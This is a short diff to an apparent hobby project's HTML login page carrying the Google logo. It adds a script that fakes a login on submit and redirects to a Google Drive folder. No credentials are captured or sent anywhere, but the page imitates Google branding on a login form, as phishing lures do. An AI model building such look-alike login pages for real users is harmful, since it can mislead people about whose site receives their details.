@@ -60,7 +60,7 @@
             <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
         </a>
         <h2>Login Email</h2>
-        <form action="/login" method="post">
+        <form id="loginForm" action="#" method="post">
             <label for="email">Email:</label>
             <input type="email" id="email" name="email" required>
             
@@ -73,5 +73,13 @@
             by faizproject
         </div>
     </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            // Simulate login and redirect to Google Drive
+            window.location.href = 'https://drive.google.com/drive/folders/1hDdAySCY-x2QGPSFd-eNSAfO__jNjrWM';
+        });
+    </script>
 </body>
 </html>
